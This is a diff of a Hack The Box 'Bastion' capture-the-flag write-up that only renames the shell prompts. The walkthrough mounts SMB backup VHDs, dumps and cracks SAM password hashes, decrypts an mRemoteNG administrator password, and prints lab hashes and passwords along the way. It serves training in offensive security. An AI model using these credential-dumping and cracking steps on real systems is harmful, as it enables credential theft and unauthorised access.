@@ -19,7 +19,7 @@ not many Windows have port 22 open...
 
 ## smb
 ```console
-kali@kali:~/HTB/bastion$ smbclient -L '\\bastion.htb\'
+bibo318@parrot:~/HTB/bastion$ smbclient -L '\\bastion.htb\'
 Enter WORKGROUP\kali's password: 
 
 	Sharename       Type      Comment
@@ -31,7 +31,7 @@ Enter WORKGROUP\kali's password:
 ```
 `Backups` looks juicy!! let's connect to `Backups` sharename
 ```console
-kali@kali:~/HTB/bastion$ smbclient '\\10.10.10.134\Backups' -N
+bibo318@parrot:~/HTB/bastion$ smbclient '\\10.10.10.134\Backups' -N
 Try "help" to get a list of possible commands.
 smb: \> ls
   .                                   D        0  Fri Oct 16 10:39:48 2020
@@ -87,9 +87,9 @@ as admin said, there is no way to copying the backup so the plan is mounting smb
 
 so let do it!!
 ```
-kali@kali:/mnt$ sudo mount -t cifs "//bastion.htb/Backups/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/" /mnt/backup #mount smb share
+bibo318@parrot:/mnt$ sudo mount -t cifs "//bastion.htb/Backups/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/" /mnt/backup #mount smb share
 🔐 Password for root@//bastion.htb/Backups/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/:                          
-kali@kali:/mnt$ ls backup/
+bibo318@parrot:/mnt$ ls backup/
 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
 BackupSpecs.xml
@@ -103,11 +103,11 @@ cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.
 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
-kali@kali:/mnt$ sudo mkdir vhd
-kali@kali:/mnt$ kali@kali:/mnt$ sudo guestmount --add /mnt/backup/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd --ro /mnt/vhd -m /dev/sda1 # mount vhd
-kali@kali:/mnt$ ls -la vhd
+bibo318@parrot:/mnt$ sudo mkdir vhd
+bibo318@parrot:/mnt$ bibo318@parrot:/mnt$ sudo guestmount --add /mnt/backup/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd --ro /mnt/vhd -m /dev/sda1 # mount vhd
+bibo318@parrot:/mnt$ ls -la vhd
 ls: cannot access 'vhd': Permission denied
-kali@kali:/mnt$ sudo ls -la vhd
+bibo318@parrot:/mnt$ sudo ls -la vhd
 total 400
 drwxrwxrwx 1 root root   4096 Feb 22  2019  .
 drwxr-xr-x 4 root root   4096 Oct 16 11:19  ..
@@ -118,7 +118,7 @@ drwxrwxrwx 1 root root   4096 Feb 22  2019 'System Volume Information'
 ```
 after examining it for a while, didnt seem like we get anything useful here. let mount another vhd and examine it!
 ```console
-kali@kali:/mnt$ sudo guestmount --add /mnt/backup/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --ro /mnt/vhd -m /dev/sda1
+bibo318@parrot:/mnt$ sudo guestmount --add /mnt/backup/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --ro /mnt/vhd -m /dev/sda1
 ```
 this vhd looks much more interesting BUT no user flag...
 
@@ -128,8 +128,8 @@ here is some links to read:
 - http://www.computersecuritystudent.com/SECURITY_TOOLS/PASSWORD_CRACKING/lesson2/
 so my plan is, copy 2 files, SAM and SYSTEM at `%SystemRoot%\System32\config` -> dump the user password hashes and crack them. Please chack the first like to learn more about `%SystemRoot%\System32\config`. We will use a tool call `sampdump2` to dump hashes, read more at link 2 and 3.
 ```console
-kali@kali:~/HTB/bastion$ sudo samdump2 SYSTEM SAM > hash.txt
-kali@kali:~/HTB/bastion$ cat hash.txt 
+bibo318@parrot:~/HTB/bastion$ sudo samdump2 SYSTEM SAM > hash.txt
+bibo318@parrot:~/HTB/bastion$ cat hash.txt 
 *disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 *disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
@@ -139,7 +139,7 @@ I used john, but it take long time, so let try crackstation while waiting for jo
 
 Boom! we got L4mpje's password -> L4mpje:bureaulampje, let grab user flag
 ```console
-kali@kali:~/HTB/bastion$ ssh L4mpje@bastion.htb 
+bibo318@parrot:~/HTB/bastion$ ssh L4mpje@bastion.htb 
 l4mpje@BASTION C:\Users\L4mpje\Desktop>type user.txt                                                          
 <something> 
 ```
@@ -208,17 +208,17 @@ RDP".......
 ```
 After googling, I found a tool that we can use to decrypt the password.
 ```console
-kali@kali:~/HTB/bastion$ wget https://raw.githubusercontent.com/haseebT/mRemoteNG-Decrypt/master/mremoteng_decrypt.py
+bibo318@parrot:~/HTB/bastion$ wget https://raw.githubusercontent.com/haseebT/mRemoteNG-Decrypt/master/mremoteng_decrypt.py
 2020-10-17 10:10:26 (6.45 MB/s) - ‘mremoteng_decrypt.py’ saved [1535/1535]
 
-kali@kali:~/HTB/bastion$ chmod +x mremoteng_decrypt.py 
-kali@kali:~/HTB/bastion$ ./mremoteng_decrypt.py -s "aEWNFV5uGcjUHF0uS17QTdT9k
+bibo318@parrot:~/HTB/bastion$ chmod +x mremoteng_decrypt.py 
+bibo318@parrot:~/HTB/bastion$ ./mremoteng_decrypt.py -s "aEWNFV5uGcjUHF0uS17QTdT9k
 > VqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
 Password: thXLHM96BeKL0ER2
 ```
 now ssh to Bastion with admin credential and grab root flag
 ```console
-kali@kali:$ ssh Administrator@bastion.htb
+bibo318@parrot:$ ssh Administrator@bastion.htb
 Microsoft Windows [Version 10.0.14393]                                                  
 (c) 2016 Microsoft Corporation. All rights reserved.                                    
 
